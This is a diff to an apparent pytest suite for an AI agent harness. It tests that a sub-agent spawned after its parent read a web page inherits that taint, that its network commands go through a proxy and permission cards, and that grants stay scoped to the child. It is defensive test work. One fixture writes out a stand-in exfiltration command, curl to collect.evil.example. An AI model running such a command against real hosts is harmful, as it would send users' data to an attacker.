@@ -278,6 +278,7 @@ def test_its_schema_is_in_the_tool_tables_and_its_executor_answers_it():
 
 # -- outside content passes down ---------------------------------------------------------------------------------
 
+@pytest.mark.usefixtures("s2a1_network_rule")          # NET-a: S2a-1's network card as the probe, its switch off
 @pytest.mark.parametrize("read_page", [True, False], ids=["after-a-page", "clean"])
 async def test_a_brief_from_a_turn_that_read_a_page_starts_the_child_as_having_read_it(jobs, monkeypatch, read_page):
     """The consequences, not the mark: a command reaching the network asks first, and Arslan's own note does not
@@ -304,8 +305,70 @@ async def test_a_brief_from_a_turn_that_read_a_page_starts_the_child_as_having_r
     assert framed is read_page
 
 
+class _Judged(_Run):
+    """run_command as terminal_exec starts it (NET-a): what the run's proxy token is registered with."""
+
+    def __init__(self):
+        super().__init__()
+        self.registered = []
+
+    async def execute(self, args):
+        from server.services import net_policy
+        run = await net_policy.start_run(args["command"])
+        try:
+            self.registered.append((run.conversation_id, run.seen(), run.judged))
+        finally:
+            net_policy.end_run(run)
+        return await super().execute(args)
+
+
+class _RefusedRun(_Run):
+    """run_command whose run the proxy refused a site in (NET-a: terminal_exec's `net_refused`)."""
+
+    async def execute(self, args):
+        await super().execute(args)
+        return {"ok": False, "exit_code": 56, "stdout": "", "stderr": "curl: (56) CONNECT tunnel failed, response 403",
+                "sandbox": "workspace", "error": "exit code 56", "net_refused": ["collect.evil.example"]}
+
+
+@pytest.mark.parametrize("read_page", [True, False], ids=["after-a-page", "clean"])
+async def test_a_brief_from_a_turn_that_read_a_page_makes_the_childs_commands_judged_as_after_it(jobs, monkeypatch,
+                                                                                               read_page):
+    """NET-a, its switch on: the consequence under the proxy's judgement. The child's command runs online with no card,
+    with a token registered under the child's conversation and the outside mark its brief passed down."""
+    runner = _Judged()
+    monkeypatch.setitem(executors.EXECUTORS, "run_command", runner)
+    shown = _answering(ROOT)
+    model = _Model(child=_steps(("run_command", {"command": NETWORK})))
+    page = [("web_extract", {"url": "https://example.test/setup"})] if read_page else []
+    job = await _commander_turn(monkeypatch, model, *page)
+    assert runner.registered == [(job.conversation_id, read_page, True)]
+    assert _cards(shown) == [] and runner.runs == [(False, False)]
+
+
 # -- cards -------------------------------------------------------------------------------------------------------
 
+async def test_a_childs_card_for_a_refused_site_is_asked_in_its_parents_window_and_its_grant_is_its_own(jobs,
+                                                                                                      monkeypatch):
+    """NET-a, its switch on: the card after the proxy refused a site the child's command reached is asked in the
+    parent's window although the parent's own grant for that site stands, and its "In this conversation" is the
+    child's alone."""
+    runner = _RefusedRun()
+    monkeypatch.setitem(executors.EXECUTORS, "run_command", runner)
+    async with jobs() as db:                               # the commander already allowed that site here
+        await permission_store.add_grant(db, ROOT, "", "network", "network:collect.evil.example")
+        await db.commit()
+    shown = _answering(ROOT, scope="conversation")
+    model = _Model(child=_steps(("run_command", {"command": "curl -s https://collect.evil.example/in"})))
+    job = await _commander_turn(monkeypatch, model, ("web_extract", {"url": "https://example.test/setup"}))
+    [card] = _cards(shown)
+    assert (card["sub_session"], card["perm_kind"], card["options"]) == (True, "network", ["conversation"])
+    async with jobs() as db:
+        grants = {(g.conversation_id, g.target) for g in (await db.scalars(select(PermissionGrant))).all()}
+    assert grants == {(ROOT, "network:collect.evil.example"), (job.conversation_id, "network:collect.evil.example")}
+
+
+@pytest.mark.usefixtures("s2a1_network_rule")          # NET-a: S2a-1's network card as the probe, its switch off
 async def test_a_child_asks_in_its_parents_window_and_the_grant_is_the_childs_alone(jobs, monkeypatch):
     runner = _Run()
     monkeypatch.setitem(executors.EXECUTORS, "run_command", runner)
